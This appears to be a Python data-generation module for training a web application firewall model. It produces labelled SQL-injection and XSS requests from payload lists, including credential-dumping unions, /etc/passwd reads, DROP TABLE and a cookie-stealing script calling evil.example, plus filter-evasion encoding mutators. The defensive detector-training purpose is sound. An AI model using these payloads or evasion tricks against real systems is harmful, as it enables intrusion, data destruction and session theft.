"""Synthetic attack generation (Step 4: "attack simulation tools" arm).

Generates labelled SQL-injection and XSS requests across techniques, placements
and obfuscation mutators — the same job SQLMap/ZAP would do against a staging
app, but reproducible and dependency-free. Purpose-built for the v1 scope
(SQLi + XSS first); other families are the out-of-scope corpora's job.

Every mutation of one base payload template shares a ``group_id`` so the
builder can keep template families leak-free across splits (Step 8).

Usage::

    python3 -m waf_transformer.data.generate_attacks \
        --out data/raw/synthetic/attacks.jsonl --count 5000 --seed 20260927
"""

from __future__ import annotations

import argparse
import json
import random
import sys
import urllib.parse
from pathlib import Path

from .schema import Label, RequestRecord

# ---------------------------------------------------------------------------
# Base payload templates: (family, technique, payload)
# ---------------------------------------------------------------------------
SQLI_PAYLOADS: list[tuple[str, str, str]] = [
    # union_sql
    ("sql_injection", "union_sql", "' UNION SELECT username,password FROM users-- "),
    ("sql_injection", "union_sql", "1 UNION ALL SELECT NULL,NULL,version()--"),
    ("sql_injection", "union_sql", "-1' UNION SELECT 1,table_name FROM information_schema.tables-- "),
    ("sql_injection", "union_sql", "1 UNION SELECT load_file('/etc/passwd')--"),
    # boolean_blind_sql
    ("sql_injection", "boolean_blind_sql", "' OR '1'='1' -- "),
    ("sql_injection", "boolean_blind_sql", "1' OR 1=1#"),
    ("sql_injection", "boolean_blind_sql", "admin'--"),
    ("sql_injection", "boolean_blind_sql", "' OR ''='"),
    ("sql_injection", "boolean_blind_sql", "1 OR 1=1"),
    ("sql_injection", "boolean_blind_sql", "') OR ('a'='a"),
    # error_based_sql
    ("sql_injection", "error_based_sql", "1' AND extractvalue(1,concat(0x7e,version()))-- "),
    ("sql_injection", "error_based_sql", "1' AND updatexml(1,concat(0x7e,user()),1)--"),
    ("sql_injection", "error_based_sql", "1 AND exp(~(SELECT * FROM (SELECT version())x))"),
    ("sql_injection", "error_based_sql", "1' AND cast((SELECT version()) as int)--"),
    # time_based_sql
    ("sql_injection", "time_based_sql", "1'; WAITFOR DELAY '0:0:5'--"),
    ("sql_injection", "time_based_sql", "1' OR SLEEP(5)-- "),
    ("sql_injection", "time_based_sql", "1'; SELECT pg_sleep(5)--"),
    ("sql_injection", "time_based_sql", "1' AND benchmark(5000000,md5(1))--"),
    # stacked_sql
    ("sql_injection", "stacked_sql", "1'; DROP TABLE users--"),
    ("sql_injection", "stacked_sql", "1'; UPDATE users SET admin=1 WHERE '1'='1"),
    ("sql_injection", "stacked_sql", "1'; INSERT INTO logs VALUES('x','y')--"),
]

XSS_PAYLOADS: list[tuple[str, str, str]] = [
    # reflected_xss
    ("xss", "reflected_xss", "<script>alert(1)</script>"),
    ("xss", "reflected_xss", "\"><script>alert(document.cookie)</script>"),
    ("xss", "reflected_xss", "<img src=x onerror=alert(1)>"),
    ("xss", "reflected_xss", "javascript:alert(1)"),
    ("xss", "reflected_xss", "<svg/onload=alert(1)>"),
    ("xss", "reflected_xss", "'><body onload=alert(1)>"),
    ("xss", "reflected_xss", "<iframe src=\"javascript:alert(1)\">"),
    ("xss", "reflected_xss", "\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>"),
    # stored_xss
    ("xss", "stored_xss", "<script>fetch('//evil.example/c?'+document.cookie)</script>"),
    ("xss", "stored_xss", "<div onmouseover=\"steal()\">free shipping</div>"),
    ("xss", "stored_xss", "<a href=\"javascript:steal()\">click</a>"),
    ("xss", "stored_xss", "<img src=\"javascript:void(0)\" onload=steal()>"),
    # dom_xss
    ("xss", "dom_xss", "javascript:eval(name)"),
    ("xss", "dom_xss", "javascript:alert(document.domain)"),
    ("xss", "dom_xss", "javascript:eval(atob('YWxlcnQoMSk='))"),
    ("xss", "dom_xss", "data:text/html,<script>alert(1)</script>"),
]

# ---------------------------------------------------------------------------
# Obfuscation mutators (Step 9 motivation: adversarial variants in training)
# ---------------------------------------------------------------------------
def _mut_plain(p: str, rng: random.Random) -> str:
    return p


def _mut_url_encode(p: str, rng: random.Random) -> str:
    return urllib.parse.quote(p, safe="")


def _mut_double_url_encode(p: str, rng: random.Random) -> str:
    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")


def _mut_case_mix(p: str, rng: random.Random) -> str:
    return "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in p)


def _mut_comment_inject(p: str, rng: random.Random) -> str:
    # S/**/ELECT, al/**/ert — keyword splitting with SQL comments
    out = []
    for word in p.split(" "):
        if len(word) > 3 and rng.random() < 0.6:
            cut = rng.randint(2, len(word) - 2)
            out.append(word[:cut] + "/**/" + word[cut:])
        else:
            out.append(word)
    return " ".join(out)


def _mut_whitespace_encode(p: str, rng: random.Random) -> str:
    alts = ["%09", "%0a", "%0b", "%0c", "%0d", "+", "%20"]
    return "".join(rng.choice(alts) if c == " " else c for c in p)


def _mut_null_byte(p: str, rng: random.Random) -> str:
    return "%00" + p if rng.random() < 0.5 else p + "%00"


def _mut_unicode_escape(p: str, rng: random.Random) -> str:
    # %uXXXX style escapes (IIS legacy) for the first few punctuation chars
    out = []
    done = False
    for c in p:
        if not done and c in "'\"<>()/\\;=":
            out.append("%%u%04x" % ord(c))
            done = True
        else:
            out.append(c)
    return "".join(out)


def _mut_html_entity(p: str, rng: random.Random) -> str:
    return "".join(f"&#x{ord(c):x};" if c in "<>\"'/&" and rng.random() < 0.7 else c for c in p)


MUTATORS = [
    ("plain", _mut_plain),
    ("url_encode", _mut_url_encode),
    ("double_url_encode", _mut_double_url_encode),
    ("case_mix", _mut_case_mix),
    ("comment_inject", _mut_comment_inject),
    ("whitespace_encode", _mut_whitespace_encode),
    ("null_byte", _mut_null_byte),
    ("unicode_escape", _mut_unicode_escape),
    ("html_entity", _mut_html_entity),
]

# ---------------------------------------------------------------------------
# Placements — WHERE the payload lands in a realistic e-commerce request
# ---------------------------------------------------------------------------
QUERY_PARAMS = ["id", "idA", "idP", "q", "page", "sort", "category", "coupon", "redirect_to", "callback"]
FORM_FIELDS = ["username", "password", "comment", "address", "q", "qty", "coupon"]
PRODUCT_PATHS = [
    "/tienda1/publico/productos.jsp",
    "/tienda1/publico/caracteristicas.jsp",
    "/tienda1/publico/buscar.jsp",
    "/tienda1/autenticar",
    "/tienda1/checkout",
    "/api/v1/products",
    "/api/v1/search",
    "/catalog/item",
]


def _place(payload: str, rng: random.Random) -> str:
    """Place a payload into a URL/form slot.

    Half the time the payload goes in **raw** (literal ``<script>``/quote
    markup; only URL-syntax-critical characters encoded) — real attackers send
    literal markup, and a always-encoded corpus teaches the model to key on
    percent-encoding instead of payload semantics (measured blind spot:
    plain XSS scored ~0.05 vs ~0.99 encoded). The other half stays fully
    percent-encoded like the classic corpora.
    """
    if rng.random() < 0.5:
        return urllib.parse.quote(payload, safe="<>()'\";/:@!$*,-_.~[] ")
    return urllib.parse.quote(payload, safe="")


def _headers(host: str, rng: random.Random, content_type: str | None = None) -> list[tuple[str, str]]:
    h = [
        ("User-Agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)"),
        ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
        ("Accept-Language", "en"),
        ("Host", host),
        ("Cookie", "JSESSIONID=%032X" % rng.getrandbits(128)),
        ("Connection", "close"),
    ]
    if content_type:
        h.append(("Content-Type", content_type))
    return h


def make_attack_records(count: int, seed: int) -> list[RequestRecord]:
    """Generate `count` synthetic attack RequestRecords, deterministic per seed."""
    rng = random.Random(seed)
    bases = SQLI_PAYLOADS + XSS_PAYLOADS
    records: list[RequestRecord] = []
    for i in range(count):
        family, technique, base = bases[i % len(bases)]
        mut_name, mut_fn = MUTATORS[rng.randrange(len(MUTATORS))]
        payload = mut_fn(base, rng)
        placement = rng.choice(
            ["query_value", "query_key", "path", "form_body", "json_body", "header"]
        )
        path = rng.choice(PRODUCT_PATHS)
        method, query, body, content_type = "GET", "", "", None

        if placement == "query_value":
            query = f"{rng.choice(QUERY_PARAMS)}={_place(payload, rng)}"
        elif placement == "query_key":
            query = f"{_place(payload, rng)}={rng.randint(1, 999)}"
        elif placement == "path":
            path = f"{path}/{_place(payload, rng)}"
        elif placement == "form_body":
            method = "POST"
            content_type = "application/x-www-form-urlencoded"
            body = f"{rng.choice(FORM_FIELDS)}={_place(payload, rng)}"
        elif placement == "json_body":
            method = "POST"
            content_type = "application/json"
            body = json.dumps({"q": payload, "qty": 1})
        else:  # header
            hdrs = _headers("shop.example.local", rng)
            name = rng.choice(["User-Agent", "Referer", "X-Forwarded-For"])
            hdrs = [(k, payload if k == name else v) for k, v in hdrs]
            records.append(
                RequestRecord(
                    id=f"synthetic:{i:06d}",
                    source="synthetic:attack_simulator",
                    method=method,
                    path=path,
                    query_string=query,
                    http_version="HTTP/1.1",
                    headers=hdrs,
                    body=body,
                    label=Label(
                        class_="attack",
                        attack_category=family,
                        attack_technique=technique,
                        in_scope=True,
                        label_source="synthetic",
                        confidence=1.0,
                    ),
                    group_id=f"gen:{family}:{technique}:{i % len(bases)}",
                    source_file="generate_attacks.py",
                    meta={
                        "generator": "generate_attacks",
                        "base_template": i % len(bases),
                        "mutator": mut_name,
                        "placement": placement,
                    },
                )
            )
            continue

        records.append(
            RequestRecord(
                id=f"synthetic:{i:06d}",
                source="synthetic:attack_simulator",
                method=method,
                path=path,
                query_string=query,
                http_version="HTTP/1.1",
                headers=_headers("shop.example.local", rng, content_type),
                body=body,
                label=Label(
                    class_="attack",
                    attack_category=family,
                    attack_technique=technique,
                    in_scope=True,
                    label_source="synthetic",
                    confidence=1.0,
                ),
                group_id=f"gen:{family}:{technique}:{i % len(bases)}",
                source_file="generate_attacks.py",
                meta={
                    "generator": "generate_attacks",
                    "base_template": i % len(bases),
                    "mutator": mut_name,
                    "placement": placement,
                },
            )
        )
    return records


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Generate synthetic SQLi/XSS attack requests")
    ap.add_argument("--out", type=Path, required=True)
    ap.add_argument("--count", type=int, default=5000)
    ap.add_argument("--seed", type=int, default=20260927)
    args = ap.parse_args(argv)

    records = make_attack_records(args.count, args.seed)
    args.out.parent.mkdir(parents=True, exist_ok=True)
    with args.out.open("w", encoding="utf-8") as fh:
        for rec in records:
            fh.write(json.dumps(rec.to_json(), ensure_ascii=False, sort_keys=True) + "\n")
    print(f"wrote {len(records)} synthetic attack records -> {args.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
